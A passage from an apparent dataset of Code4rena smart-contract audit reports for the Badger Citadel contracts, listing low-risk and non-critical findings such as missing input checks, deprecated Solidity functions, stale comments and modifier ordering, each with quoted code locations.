onlyRole(CITADEL_MINTER_ROLE)\r\n        gacPausable\r\n```\r\n19. File: src/Funding.sol (lines [163-168](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L163-L168))\r\n```solidity\r\n    function deposit(uint256 _assetAmountIn, uint256 _minCitadelOut)\r\n        external\r\n        onlyWhenPriceNotFlagged\r\n        gacPausable\r\n        nonReentrant\r\n        returns (uint256 citadelAmount_)\r\n```\r\n20. File: src/Funding.sol (lines [265-268](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L265-L268))\r\n```solidity\r\n    function setDiscount(uint256 _discount)\r\n        external\r\n        gacPausable\r\n        onlyRoleOrAddress(POLICY_OPERATIONS_ROLE, funding.discountManager)\r\n```\r\n21. File: src/Funding.sol (lines [278-281](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L278-L281))\r\n```solidity\r\n    function clearCitadelPriceFlag()\r\n        external\r\n        gacPausable\r\n        onlyRole(POLICY_OPERATIONS_ROLE)\r\n```\r\n22. File: src/Funding.sol (lines [291-294](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L291-L294))\r\n```solidity\r\n    function setAssetCap(uint256 _assetCap)\r\n        external\r\n        gacPausable\r\n        onlyRole(POLICY_OPERATIONS_ROLE)\r\n```\r\n23. File: src/Funding.sol (lines [315-319](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L315-L319))\r\n```solidity\r\n    function sweep(address _token)\r\n        external\r\n        gacPausable\r\n        nonReentrant\r\n        onlyRole(TREASURY_OPERATIONS_ROLE)\r\n```\r\n24. File: src/Funding.sol (lines [334-337](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L334-L337))\r\n```solidity\r\n    function claimAssetToTreasury()\r\n        external\r\n        gacPausable\r\n        onlyRole(TREASURY_OPERATIONS_ROLE)\r\n```\r\n25. File: src/Funding.sol (lines [356-359](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L356-L359))\r\n```solidity\r\n    function setDiscountLimits(uint256 _minDiscount, uint256 _maxDiscount)\r\n        external\r\n        gacPausable\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n26. File: src/Funding.sol (lines [373-376](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L373-L376))\r\n```solidity\r\n    function setDiscountManager(address _discountManager)\r\n        external\r\n        gacPausable\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n27. File: src/Funding.sol (lines [383-386](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L383-L386))\r\n```solidity\r\n    function setSaleRecipient(address _saleRecipient)\r\n        external\r\n        gacPausable\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n28. File: src/Funding.sol (lines [397-400](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L397-L400))\r\n```solidity\r\n    function setCitadelAssetPriceBounds(uint256 _minPrice, uint256 _maxPrice)\r\n        external\r\n        gacPausable\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n29. File: src/Funding.sol (lines [414-417](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L414-L417))\r\n```solidity\r\n    function updateCitadelPriceInAsset()\r\n        external\r\n        gacPausable\r\n        onlyRole(KEEPER_ROLE)\r\n```\r\n30. File: src/Funding.sol (lines [447-450](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L447-L450))\r\n```solidity\r\n    function updateCitadelPriceInAsset(uint256 _citadelPriceInAsset)\r\n        external\r\n        gacPausable\r\n        onlyCitadelPriceInAssetOracle\r\n```\r\n31. File: src/KnightingRound.sol (line [272](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L272))\r\n```solidity\r\n    function finalize() external onlyRole(CONTRACT_GOVERNANCE_ROLE) {\r\n```\r\n32. File: src/KnightingRound.sol (lines [289-291](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L289-L291))\r\n```solidity\r\n    function setSaleStart(uint256 _saleStart)\r\n        external\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n33. File: src/KnightingRound.sol (lines [308-310](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L308-L310))\r\n```solidity\r\n    function setSaleDuration(uint256 _saleDuration)\r\n        external\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n34. File: src/KnightingRound.sol (lines [327-329](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L327-L329))\r\n```solidity\r\n    function setTokenOutPrice(uint256 _tokenOutPrice)\r\n        external\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n35. File: src/KnightingRound.sol (lines [345-347](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L345-L347))\r\n```solidity\r\n    function setSaleRecipient(address _saleRecipient)\r\n        external\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n36. File: src/KnightingRound.sol (lines [367-369](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L367-L369))\r\n```solidity\r\n    function setGuestlist(address _guestlist)\r\n        external\r\n        onlyRole(TECH_OPERATIONS_ROLE)\r\n```\r\n37. File: src/KnightingRound.sol (lines [380-382](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L380-L382))\r\n```solidity\r\n    function setTokenInLimit(uint256 _tokenInLimit)\r\n        external\r\n        onlyRole(TECH_OPERATIONS_ROLE)\r\n```\r\n38. File: src/KnightingRound.sol (line [402](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L402))\r\n```solidity\r\n    function sweep(address _token) external gacPausable nonReentrant onlyRole(TREASURY_OPERATIONS_ROLE) {\r\n```\r\n39. File: src/lib/GlobalAccessControlManaged.sol (lines [27-29](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L27-L29))\r\n```solidity\r\n    function __GlobalAccessControlManaged_init(address _globalAccessControl)\r\n        public\r\n        onlyInitializing\r\n```\r\n40. File: src/StakedCitadelVester.sol (lines [163-165](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L163-L165))\r\n```solidity\r\n    function setVestingDuration(uint256 _duration)\r\n        external\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n```\r\n41. File: src/SupplySchedule.sol (lines [132-135](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L132-L135))\r\n```solidity\r\n    function setMintingStart(uint256 _globalStartTimestamp)\r\n        external\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n        gacPausable\r\n```\r\n42. File: src/SupplySchedule.sol (lines [150-153](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L150-L153))\r\n```solidity\r\n    function setEpochRate(uint256 _epoch, uint256 _rate)\r\n        external\r\n        onlyRole(CONTRACT_GOVERNANCE_ROLE)\r\n        gacPausable\r\n```",
    "dataSource": {
      "name": "code-423n4/2022-04-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-04-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-04-badger-citadel-findings/issues/181"
    }
  },
  {
    "title": "QA Report",
    "body": "Vulnerability details:\r\n\r\n## Low Risk Issues\r\n\r\n### New min/max values should be checked against the current stored value\r\nIf `citadelPriceInAsset` is above the new max or below the new min, the next update will likely have a similar value and immediately cause problems. The code should require that the current value falls within the new range\r\n1. File: src/Funding.sol (lines [402-403](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/Funding.sol#L402-L403))\r\n```solidity\r\n        minCitadelPriceInAsset = _minPrice;\r\n        maxCitadelPriceInAsset = _maxPrice;\r\n```\r\n\r\n### Loss of precision\r\nIf `tokenOutPrice` is less than `tokenInNormalizationValue`, then the amount will be zero for some amounts. The caller of `getAmountOut()` should revert if `tokenOutAmount` ends up being zero\r\n1. File: src/KnightingRound.sol (lines [239-241](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/KnightingRound.sol#L239-L241))\r\n```solidity\r\n        tokenOutAmount_ =\r\n            (_tokenInAmount * tokenOutPrice) /\r\n            tokenInNormalizationValue;\r\n```\r\n\r\n### Unsafe calls to optional ERC20 functions\r\n`decimals()`, `name()` and `symbol()` are optional parts of the ERC20 specification, so there are tokens that do not implement them. It's not safe to cast arbitrary token addresses in order to call these functions. If `IERC20Metadata` is to be relied on, that should be the variable type of the token variable, rather than it being `address`, so the compiler can verify that types correctly match, rather than this being a runtime failure. See [this](https://github.com/code-423n4/2021-05-yield-findings/issues/32) prior instance of this issue which was marked as Low risk. Do [this](https://github.com/boringcrypto/BoringSolidity/blob/c73ed73afa9273fbce93095ef177513191782254/contracts/libraries/BoringERC20.sol#L49-L55) to resolve the issue.\r\n1. File: src/interfaces/erc20/IERC20.sol (lines [14-18](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/interfaces/erc20/IERC20.sol#L14-L18))\r\n```solidity\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint256);\r\n```\r\n2. File: src/KnightingRound.sol (line [148](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/KnightingRound.sol#L148))\r\n```solidity\r\n        tokenInNormalizationValue = 10**tokenIn.decimals();\r\n```\r\n3. File: src/StakedCitadel.sol (line [218](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/StakedCitadel.sol#L218))\r\n```solidity\r\n                abi.encodePacked(_defaultNamePrefix, namedToken.name())\r\n```\r\n4. File: src/StakedCitadel.sol (line [226](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/StakedCitadel.sol#L226))\r\n```solidity\r\n                abi.encodePacked(_symbolSymbolPrefix, namedToken.symbol())\r\n```\r\n\r\n### Missing checks for `address(0x0)` when assigning values to `address` state variables\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [186](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L186))\r\n```solidity\r\n        stakingProxy = _staking;\r\n```\r\n2. File: src/lib/SettAccessControl.sol (line [39](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SettAccessControl.sol#L39))\r\n```solidity\r\n        strategist = _strategist;\r\n```\r\n3. File: src/lib/SettAccessControl.sol (line [46](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SettAccessControl.sol#L46))\r\n```solidity\r\n        keeper = _keeper;\r\n```\r\n4. File: src/lib/SettAccessControl.sol (line [53](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SettAccessControl.sol#L53))\r\n```solidity\r\n        governance = _governance;\r\n```\r\n\r\n### `initialize` functions can be front-run\r\nSee [this](https://github.com/code-423n4/2021-10-badgerdao-findings/issues/40) finding from a prior badger-dao contest for details\r\n1. File: src/CitadelMinter.sol (line [109](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/CitadelMinter.sol#L109))\r\n```solidity\r\n    function initialize(\r\n```\r\n2. File: src/KnightingRound.sol (line [119](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/KnightingRound.sol#L119))\r\n```solidity\r\n    ) external initializer {\r\n```\r\n3. File: src/Funding.sol (line [112](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/Funding.sol#L112))\r\n```solidity\r\n    ) external initializer {\r\n```\r\n4. File: src/StakedCitadel.sol (line [179](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/StakedCitadel.sol#L179))\r\n```solidity\r\n    ) public initializer whenNotPaused {\r\n```\r\n\r\n\r\n### `now` is deprecated\r\nUse `block.timestamp` instead\r\n\r\n1. File: external/MedianOracle.sol (line [129](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L129))\r\n```solidity\r\n        require(timestamps[index_recent].add(reportDelaySec) <= now);\r\n```\r\n2. File: external/MedianOracle.sol (line [131](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L131))\r\n```solidity\r\n        reports[index_past].timestamp = now;\r\n```\r\n3. File: external/MedianOracle.sol (line [134](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L134))\r\n```solidity\r\n        emit ProviderReportPushed(providerAddress, payload, now);\r\n```\r\n4. File: external/MedianOracle.sol (line [161](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L161))\r\n```solidity\r\n        uint256 minValidTimestamp =  now.sub(reportExpirationTimeSec);\r\n```\r\n5. File: external/MedianOracle.sol (line [162](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L162))\r\n```solidity\r\n        uint256 maxValidTimestamp =  now.sub(reportDelaySec);\r\n```\r\n\r\n### `safeApprove()` is deprecated\r\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`\r\n\r\n1. File: src/CitadelMinter.sol (line [133](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L133))\r\n```solidity\r\n        IERC20Upgradeable(_citadelToken).safeApprove(_xCitadel, type(uint256).max);\r\n```\r\n2. File: src/CitadelMinter.sol (line [136](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L136))\r\n```solidity\r\n        IERC20Upgradeable(_xCitadel).safeApprove(_xCitadelLocker, type(uint256).max);\r\n```\r\n3. File: src/Funding.sol (line [142](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L142))\r\n```solidity\r\n        IERC20(_citadel).safeApprove(address(_xCitadel), type(uint256).max);\r\n```\r\n\r\n### Open TODOs\r\nCode architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment\r\n\r\n1. File: src/Funding.sol (line [15](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L15))\r\n```solidity\r\n * TODO: Better revert strings\r\n```\r\n2. File: src/Funding.sol (line [61](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L61))\r\n```solidity\r\n    // TODO: we should conform to some interface here\r\n```\r\n3. File: src/Funding.sol (line [183](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L183))\r\n```solidity\r\n        // TODO: Check gas costs. How does this relate to market buying if you do want to deposit to xCTDL?\r\n```\r\n4. File: src/GlobalAccessControl.sol (line [106](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L106))\r\n```solidity\r\n    /// TODO: Add string -> hash EnumerableSet to a new RoleRegistry contract for easy on-chain viewing.\r\n```\r\n5. File: src/KnightingRound.sol (line [14](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L14))\r\n```solidity\r\n * TODO: Better revert strings\r\n```\r\n6. File: src/SupplySchedule.sol (line [159](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L159))\r\n```solidity\r\n        // TODO: Require this epoch is in the future. What happens if no data is set? (It just fails to mint until set)\r\n```\r\n\r\n### Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions\r\nSee [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [26](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L26))\r\n```solidity\r\ncontract StakedCitadelLocker is Initializable, ReentrancyGuardUpgradeable, OwnableUpgradeable {\r\n```\r\n2. File: src/CitadelMinter.sol (lines [23-25](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L23-L25))\r\n```solidity\r\ncontract CitadelMinter is\r\n    GlobalAccessControlManaged,\r\n    ReentrancyGuardUpgradeable\r\n```\r\n3. File: src/CitadelToken.sol (line [8](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelToken.sol#L8))\r\n```solidity\r\ncontract CitadelToken is GlobalAccessControlManaged, ERC20Upgradeable {\r\n```\r\n4. File: src/Funding.sol (line [17](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L17))\r\n```solidity\r\ncontract Funding is GlobalAccessControlManaged, ReentrancyGuardUpgradeable {\r\n```\r\n5. File: src/GlobalAccessControl.sol (lines [19-21](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L19-L21))\r\n```solidity\r\ncontract GlobalAccessControl is\r\n    AccessControlEnumerableUpgradeable,\r\n    PausableUpgradeable\r\n```\r\n6. File: src/KnightingRound.sol (line [16](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L16))\r\n```solidity\r\ncontract KnightingRound is GlobalAccessControlManaged, ReentrancyGuardUpgradeable {\r\n```\r\n7. File: src/lib/GlobalAccessControlManaged.sol (line [12](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L12))\r\n```solidity\r\ncontract GlobalAccessControlManaged is PausableUpgradeable {\r\n```\r\n8. File: src/StakedCitadel.sol (lines [59-63](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L59-L63))\r\n```solidity\r\ncontract StakedCitadel is\r\n    ERC20Upgradeable,\r\n    SettAccessControl,\r\n    PausableUpgradeable,\r\n    ReentrancyGuardUpgradeable\r\n```\r\n9. File: src/StakedCitadelVester.sol (lines [14-16](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L14-L16))\r\n```solidity\r\ncontract StakedCitadelVester is\r\n    GlobalAccessControlManaged,\r\n    ReentrancyGuardUpgradeable\r\n```\r\n\r\n### Misleading comment\r\nThe value of `transferFromDisabled` is never updated, let alone in an `initialize()` function. I don't see any bugs related to this, but this comment makes it seem as though something was overlooked when branching.\r\n1. File: src/GlobalAccessControl.sol (line [51](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L51))\r\n```solidity\r\n    bool public transferFromDisabled; // Set to true in initialize\r\n```\r\n\r\n### Unbounded loop\r\nIf there are too many pools, the function may run out of gas while returning them. It's best to allow for a start offset and maximum length, so data can be returned in batches that don't run out of gas\r\n1. File: src/CitadelMinter.sol (lines [143-147](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/CitadelMinter.sol#L143-L147))\r\n```solidity\r\n    function getFundingPoolWeights()\r\n        external\r\n        view\r\n        returns (address[] memory pools, uint256[] memory weights)\r\n    {\r\n```\r\n\r\n\r\n## Non-critical Issues\r\n\r\n\r\n### Multiple definitions of an interface\r\nThese are the only two differences between `IEmptyStrategy` and `IStrategy`. `IEmptyStrategy` should be changed to be `is IStrategy` and remove the duplicate functions\r\n1. File: src/interfaces/badger/IEmptyStrategy.sol (lines [12-14](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/interfaces/badger/IEmptyStrategy.sol#L12-L14))\r\n```solidity\r\n    function initialize(address vault, address want) external;\r\n\r\n    function getName() external view returns (string memory);\r\n```\r\n\r\n### Unused file\r\n1. File: src/interfaces/convex/BoringMath.sol (line [1](https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/interfaces/convex/BoringMath.sol#L1))\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\n```\r\n\r\n### Contract header not updated after branching\r\n1. File: src/GlobalAccessControl.sol (lines [12-17](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/GlobalAccessControl.sol#L12-L17))\r\n```solidity\r\n/**\r\n * @title Badger Geyser\r\n @dev Tracks stakes and pledged tokens to be distributed, for use with\r\n @dev BadgerTree merkle distribution system. An arbitrary number of tokens to\r\n distribute can be specified.\r\n */\r\n```\r\n\r\n### Comment not moved when function was moved\r\n1. File: src/SupplySchedule.sol (lines [52-53](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/SupplySchedule.sol#L52-L53))\r\n```solidity\r\n    // @dev duplicate of getMintable() with debug print added\r\n    // @dev this function is out of scope for reviews and audits\r\n```\r\n\r\n### Comments not updated after branching\r\n\r\nThere are a lot of references to the old owner-related code. The comments should be updated to talk about the new RBAC system\r\n1. File: src/KnightingRound.sol\r\n```\r\n$ grep owner src/KnightingRound.sol\r\n     * @notice Finalize the sale after sale duration. Can only be called by owner\r\n     * @notice Update the sale start time. Can only be called by owner\r\n     * @notice Update sale duration. Can only be called by owner\r\n     * @notice Modify the tokenOut price in. Can only be called by owner\r\n     * @notice Update the `tokenIn` receipient address. Can only be called by owner\r\n     * @notice Update the guestlist address. Can only be called by owner\r\n     * @notice Modify the max tokenIn that this contract can take. Can only be called by owner\r\n     * @notice Transfers out any tokens accidentally sent to the contract. Can only be called by owner\r\n```\r\n\r\nThe price calulation seems inverted since this comment was first written, so it should be updated to reflect the new calculation:\r\n2. File: src/KnightingRound.sol (line [43](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/KnightingRound.sol#L43))\r\n```solidity\r\n    /// eg. 1 WBTC (8 decimals) = 40,000 CTDL ==> price = 10^8 / 40,000\r\n```\r\n\r\n### Remove `include` for ds-test\r\nTest code should not be mixed in with production code. The production version should be extended and have its functions overridden for testing purposes\r\n\r\n1. File: src/SupplySchedule.sol (line [4](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L4))\r\n```solidity\r\nimport \"ds-test/test.sol\";\r\n```\r\n\r\n### The `nonReentrant` `modifier` should occur before all other modifiers\r\nThis is a best-practice to protect against reentrancy in other modifiers\r\n\r\n1. File: src/CitadelMinter.sol (line [173](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L173))\r\n```solidity\r\n        nonReentrant\r\n```\r\n2. File: src/CitadelMinter.sol (line [254](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L254))\r\n```solidity\r\n        nonReentrant\r\n```\r\n3. File: src/CitadelMinter.sol (line [298](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L298))\r\n```solidity\r\n    ) external onlyRole(POLICY_OPERATIONS_ROLE) gacPausable nonReentrant {\r\n```\r\n4. File: src/Funding.sol (line [167](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L167))\r\n```solidity\r\n        nonReentrant\r\n```\r\n5. File: src/Funding.sol (line [318](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L318))\r\n```solidity\r\n        nonReentrant\r\n```\r\n6. File: src/KnightingRound.sol (line [402](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L402))\r\n```solidity\r\n    function sweep(address _token) external gacPausable nonReentrant onlyRole(TREASURY_OPERATIONS_ROLE) {\r\n```\r\n\r\n### Solidity versions greater than the current version should not be included in the pragma range\r\nThe below pragmas should be `<` 0.9.0, not `<=`\r\n```\r\n$ grep '<= 0.9.0' src/*/*/*\r\nsrc/interfaces/badger/IBadgerGuestlist.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/badger/IBadgerVipGuestlist.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/badger/IEmptyStrategy.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/badger/IStrategy.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/badger/IVault.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/citadel/ICitadelToken.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/citadel/IGac.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/citadel/IStakedCitadelLocker.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/citadel/ISupplySchedule.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/citadel/IVesting.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/convex/BoringMath.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/convex/IRewardStaking.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/convex/IStakingProxy.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/convex/MathUtil.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\nsrc/interfaces/erc20/IERC20.sol:pragma solidity >= 0.5.0 <= 0.9.0;\r\n```\r\n\r\n### Adding a `return` statement when the function defines a named return variable, is redundant\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [272](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L272))\r\n```solidity\r\n        return userRewards;\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [311](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L311))\r\n```solidity\r\n        return amount;\r\n```\r\n3. File: external/StakedCitadelLocker.sol (line [338](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L338))\r\n```solidity\r\n        return amount;\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [399](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L399))\r\n```solidity\r\n        return supply;\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [417](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L417))\r\n```solidity\r\n        return supply;\r\n```\r\n\r\n### `require()`/`revert()` 